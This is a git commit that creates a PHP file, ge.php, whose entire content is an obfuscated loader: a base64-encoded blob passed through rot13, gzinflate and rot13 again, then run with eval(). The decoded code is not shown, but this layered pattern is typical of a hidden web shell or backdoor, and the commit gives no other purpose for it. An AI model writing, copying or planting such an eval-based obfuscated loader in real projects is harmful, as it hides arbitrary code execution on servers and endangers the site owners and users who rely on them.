8ad827ab46b1465af65f82f24378637d15c88918
Saeful Rochim <32793466+dalungid@users.noreply.github.com>
2024-10-25 15:29:27 +0700

    Create ge.php

---
+++ ge.php
@@ -0,0 +1,4 @@
+<?php 
+$q = "XZDRV8MwFIbvB3uHUBDOCtps7dIwFTYvxOEcgzFYdU+bCiNbQtdPRvrupraIa65l/v/jg5O6hNmN3HrXVKQKcIgiwOsVg2k6AT9nqRQg1ykJrsWaGrqm1sEDLDf7zf4g79/fXvlcCwxopXKeS1SzIHGfCQuRn9O54KVXHTgylSoipkhzGENlMSdaEWZscHd6RjPvqbvCGssErxOdGxiIsmGITq+NmJS/5Riwkcrys6u9+Ms2uV9fZ6N54eEfrcBSXfobn59J66D1z+VS6ZMPPvaH7eqIRW98UeO07K0Y38K/d4iDoB0+cLBGgYuOmozG9EQZ+NNn01b3DQ==";
+eval(str_rot13(gzinflate(str_rot13(base64_decode($q)))));
+?>
